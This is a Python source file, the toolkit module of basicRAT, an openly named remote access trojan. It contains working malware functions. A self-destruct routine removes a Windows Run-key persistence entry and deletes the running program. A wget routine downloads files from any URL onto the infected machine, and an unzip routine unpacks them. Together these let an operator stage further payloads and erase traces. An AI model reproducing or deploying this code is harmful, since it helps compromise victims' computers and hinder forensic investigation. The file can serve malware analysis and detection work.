# -*- coding: utf-8 -*-

#
# basicRAT toolkit module
# https://github.com/vesche/basicRAT
#

import datetime
import os
import sys
import urllib
import zipfile


def selfdestruct(plat):
    if plat == 'win':
        import _winreg
        from _winreg import HKEY_CURRENT_USER as HKCU
        
        run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'

        try:
            reg_key = _winreg.OpenKey(HKCU, run_key, 0, _winreg.KEY_ALL_ACCESS)
            _winreg.DeleteValue(reg_key, 'br')
            _winreg.CloseKey(reg_key)
        except WindowsError:
            pass

    elif plat == 'nix':
        pass

    elif plat == 'mac':
        pass

    # self delete basicRAT
    os.remove(sys.argv[0])
    sys.exit(0)


def unzip(f):
    if os.path.isfile(f):
        try:
            with zipfile.ZipFile(f) as zf:
                zf.extractall('.')
                return 'File {} extracted.'.format(f)
        except zipfile.BadZipfile:
            return 'Error: Failed to unzip file.'
    else:
        return 'Error: File not found.'


def wget(url):
    if not url.startswith('http'):
        return 'Error: URL must begin with http:// or https:// .'

    fname = url.split('/')[-1]
    if not fname:
        dt = str(datetime.datetime.now()).replace(' ', '-').replace(':', '-')
        fname = 'file-{}'.format(dt)

    try:
        urllib.urlretrieve(url, fname)
    except IOError:
        return 'Error: Download failed.'

    return 'File {} downloaded.'.format(fname)
